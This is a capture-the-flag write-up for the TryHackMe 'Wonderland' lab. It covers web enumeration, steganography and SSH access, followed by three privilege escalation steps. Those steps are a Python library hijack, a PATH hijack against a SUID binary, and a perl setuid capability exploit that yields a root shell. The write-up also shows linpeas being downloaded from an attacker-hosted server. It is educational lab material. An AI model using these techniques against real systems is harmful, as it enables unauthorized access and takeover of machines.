---
layout: default
---

# TryHackMe - Wonderland writeup 

![Wonderland header](/assets/images/thm_wonderland/wonderland_header.png)

[TryHackMe Wonderland room link](https://tryhackme.com/room/wonderland)

:hole: :rabbit2:

This system starts with a web server that leads to the wonderland linux system where many different users such as **alice** and were a few others live like the **rabbit** and the mad **hatter**. We first look for the clues on the web servers pages and follow the white rabbit down the rabbit whole of the websites directories until we find a key in the source code that lets us SSH onto the system as **alice**. There are 3 stages to the privilege escalation which are cool and each one uses a slightly different technique. We have to go and visit each users home directory to see what goodies they have there and what each one of them can execute and do in order for us to escalate our privileges to root.

## Initial recon
### Nmap scan

We start initial active recon with an fast (-T4) aggressive (-A) TCP SYN (-sS) version (-sV) scan of all TCP ports (-p-) and output to all formats (-oA).
```
sudo nmap -sS -sV -A -T4 -vv -p- -oA syn_ver_agg_fast_alltcp_ports 10.10.85.247
```

We can also run a quick version UDP scan (-sUV) of the top 1000 ports to see if there is any interesting UDP ports.
```
sudo namp -sUV -vv 10.10.85.247 -oA udp_ver_top1000_scan
```

### Nmap results
#### TCP Scan

Only two ports 22 (SSH) and 80 (HTTP Web Server) are open and of interest. We will start enumeration of the web server in the next section.

```
# Nmap 7.80 scan initiated Sat Jul 18 11:30:09 2020 as: nmap -sS -sV -A -T4 -vv -p- -oA syn_ver_agg_fast_alltcp_ports 10.10.85.247
Nmap scan report for 10.10.85.247
Host is up, received echo-reply ttl 63 (0.17s latency).
Scanned at 2020-07-18 11:30:10 EDT for 457s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                                                                                       
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)                                                                                       
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN                                                                 
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)                                                                                      
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=                                                                                                                                        
|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)                                                                                    
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh                                                                   
80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)                                                        
| http-methods:                                                                                                                                      
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                         
|_http-title: Follow the white rabbit.                                                                                                               
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).                                                  
TCP/IP fingerprint:                                                                                                                                  
OS:SCAN(V=7.80%E=4%D=7/18%OT=22%CT=1%CU=34542%PV=Y%DS=2%DC=T%G=Y%TM=5F13174                                                                          
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=103%TI=Z%CI=Z%TS=A)OPS(O1=M                                                                          
OS:508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%                                                                          
OS:O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%                                                                          
OS:DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=                                                                          
OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF                                                                          
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=                                                                          
OS:%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%                                                                          
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)                                                                            
                                                                                                                                                     
Uptime guess: 43.062 days (since Fri Jun  5 10:08:51 2020)                                                                                           
Network Distance: 2 hops                                                                                                                             
TCP Sequence Prediction: Difficulty=258 (Good luck!)                                                                                                 
IP ID Sequence Generation: All zeros                                                                                                                 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                              
                                                                                                                                                     
TRACEROUTE (using port 8080/tcp)                                                                                                                     
HOP RTT       ADDRESS                                                                                                                                
1   170.44 ms 10.11.0.1
2   170.77 ms 10.10.85.247

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 18 11:37:47 2020 -- 1 IP address (1 host up) scanned in 458.25 seconds
```

#### UDP Scan

Nothing much interesting on the UDP ports.

```
# Nmap 7.80 scan initiated Sat Jul 18 12:03:58 2020 as: nmap -sUV -vv -oA udp_ver_top1000_scan 10.10.85.247
Increasing send delay for 10.10.85.247 from 200 to 400 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.85.247 from 400 to 800 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for 10.10.85.247
Host is up, received echo-reply ttl 63 (0.18s latency).
Scanned at 2020-07-18 12:03:58 EDT for 1189s
Not shown: 999 closed ports
Reason: 999 port-unreaches
PORT   STATE         SERVICE REASON      VERSION
68/udp open|filtered dhcpc   no-response

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 18 12:23:47 2020 -- 1 IP address (1 host up) scanned in 1189.55 second
```


## Web server enumeration

We start by manually visiting and browsing the website. There isn't much there, viewing the landing pages source code we find the image directory **/img** that has a few other images. 

![Wonderland Web page](/assets/images/thm_wonderland/thm_wonderland_web_1.jpg)


Download all the image files and run **binwalk, exiftool and steghide** on the images to see if there is anything hidden in them. 

```
# Check for hints in the metadata of the image using exiftool
exiftool white_rabbit_1.jpg 
exiftool alice_door.png
exiftool alice_door.jpg

# Check to see if there are any files hidden in the images using binwalk.
binwalk white_rabbit_1.jpg
binwalk alice_door.png
binwalk alice_door.jpg

# Check for and extract hidden steganographic files within the image files.
steghide info white_rabbit_1.jpg

# PNG files seem not to be supported by steghide.
steghide info alice_door.jpg
```

![Enumerating Images with steghide](/assets/images/thm_wonderland/thm_wonderland_steghide_1.jpg)

There were not hints in the metadata using exiftool, binwalk did not also report anything unusual but steghide did find a **hints.txt** file hidden in the *white_rabbit_1.jpg* file.

We can **extract** the data (hints.txt) from the image by using the **-sf** parameter. Just hit enter to send a blank passphrase to extract the file.
```
steghide extract -sf white_rabbit_1.jpg 
```

![Extracting hidden file with steghide](/assets/images/thm_wonderland/thm_wonderland_steghide_2.jpg)

### Dirbuster scan results

Run a dirbuster scan to find also find any hidden directories and file paths on the web server.

```
sudo dirbuster
```

* Tip - set the threads to **40 to 50 or more** and set the scan to not **Be Recursive** to speed up the dirbuster scan.
* Tip - a good wordlist to use is located in **/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt** on kali linux

![Dirbuster Scan](/assets/images/thm_wonderland/thm_wonderland_dirbuster_1.jpg)

There are two interesting folder paths returned from the dirbuster scan.
* /r/
* /poem/

![Keep going clue](/assets/images/thm_wonderland/thm_wonderland_web_2.jpg)

The **/r/** URL path leads to an interesting page, while **/poem/** URL path leads to **"The Jabberwocky"** poem text on the web page.
Remember the hint _**"folllow the r a b b i t"**_ in the hint.txt file we found earlier will help you solve the URL path we need to find which is 
**http://10.10.85.247/r/a/b/b/i/t/**

View the page source code of this final page to find an SSH key for alice hidden in it.

![Web server pages and source code](/assets/images/thm_wonderland/thm_wonderland_web_3.jpg)


## Privilege Escalation
### Stage 1 - alice to rabbit

The nmap scan revealed that SSH port 22 was open, and what we found in the source code of the final web page looks like an SSH credentials so if you give it a try you will be able to log into the system.

```
sudo ssh alice@10.10.85.247
```

Use the password you found in the web pages source code to gain initial shell access as the **alice** user.

It's good practice to check what you can run as sudo when you get access to a linux machine.
```
sudo -l
```

![Alice SSH shell and sudo](/assets/images/thm_wonderland/thm_wonderland_alice_1.jpg)

It appears that the user **alice** can run the following python file as the **rabbit** user which is not standard.
```
/usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Host and download linpeas.sh enumeration script onto the target system in order to quickly enumerate possible other vectors for privilege escalation.

```
# On the attacking system start a python web server to host your linpeas script.
sudo python3 -m http.server 80

# On the victim system download the linpeas script with wget
wget http://<attacking_ip_address>/linpeas.sh

# Set execute permissions
chmod +x linpeas.sh

# Run linpeas with all (-a) checks and save to a file for further analysis for later if needed using tee command.
./linpeas.sh -a | tee linpeas_results.txt
```

![Linpeas capabilities detection](/assets/images/thm_wonderland/thm_wonderland_linpeas_1.jpg)

The linpeas scan as alice did reveal something interesting which is the capabilities set for perl. This can lead to privilege escalation as we will describe later.
We cannot use this now as alice is not allowed to run perl.

There is a way to escalate our privileges to the **rabbit** user by leveraging the python script we found earlier **/home/alice/walrus_and_the_carpenter.py**
If you _cat_ the file you will see it **imports random** library. Python loads the library by first checking where it is located by using the python path system variables. You can check the path variable by using the following command in your shell.

```
python3 -c 'import sys; print(sys.path)';
````

![Python path](/assets/images/thm_wonderland/thm_wonderland_python_1.jpg)


As you can see it will first check the current working directory '' and then proceed to check '/usr/linb/python36.zip' and on and on. So you can simply create a new file called random.py and insert the following code into it which will then execute and open a shell as the user that executes the python script the next time.

```python
import os

os.system("/bin/bash")
```

![Python privilege escalation to rabbit](/assets/images/thm_wonderland/thm_wonderland_rabbit_1.jpg)

As you can see when we run the sudo command below we get a bash shell as the user **rabbit** as the random library executes the /bin/bash command from within the python script.

```
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

### Stage 2 - rabbit to hatter

You can run linpeas script again as the **rabbit** user and it will reveal the **teaParty** file which has its SUID bits set and it will also show the perl capabilities we found earlier, however rabbit can't run perl also so we will continue investigate the teaParty binary file further.

![teaParty file](/assets/images/thm_wonderland/thm_wonderland_rabbit_2.jpg)

As you can see the SUID bit is set on this file which can help us escalate our privileges. It seems to be a standard C executable binary file that when we cat it we can see that its executing the **date** linux function. 

![teaParty file date output](/assets/images/thm_wonderland/thm_wonderland_rabbit_3.jpg)

Similar to the python escalation earlier we can create a new bash file called date in our **/tmp** folder and then manipulate the **$PATH** variable to execute our date function first in order to escalate our privileges using this teaParty binary file.

```
# Change the path variable to include /tmp folder
export PATH=/tmp:$PATH

# Make sure you are in the /tmp folder and then create the date bash file
cd /tmp
nano date
```

![Setting $PATH variable](/assets/images/thm_wonderland/thm_wonderland_rabbit_4.jpg)

Insert the folloing code into the date script.
```bash
#!/bin/bash
/bin/bash
```

Change its file permissions to be able to execute.

```bash
chmod +x /tmp/date
```

Finally execute the teaParty binary file and you should be the user **hatter** now. If you check the hatter's home directory you will find a password.txt file which is the hatters SSH key that you can use to log into his account via SSH.

![Rabbit to hatter](/assets/images/thm_wonderland/thm_wonderland_rabbit_5.jpg)

### Stage 3 - hatter to root

Remember that perl capabiliies we found earlier using linpeas script. Lets try to see if the **hatter** user can run perl, which it seems like he can.

If you visit the following [GTFO link](https://gtfobins.github.io/gtfobins/perl/#capabilities) you will find a command we can use to escalate our privileges to root.

* Tip - This is a great article that explains capabilities and how to exploit them: [Linux privilege escalation using capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)

```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

![Perl Capabilities privilege escalation](/assets/images/thm_wonderland/thm_wonderland_hatter_1.jpg)

Now you can grab the root.txt and user.txt flags as seen above and that should be it for this machine.

## Summary

This was a pretty cool machine that required a bit of enumeration at first on the web server pages that lead us to clues on how to gain access to the machine. Once we had gained initial access we enumerated each user and found ways to change our user permissions each time using 3 different privilege escalation techniques which were pretty unique and cool.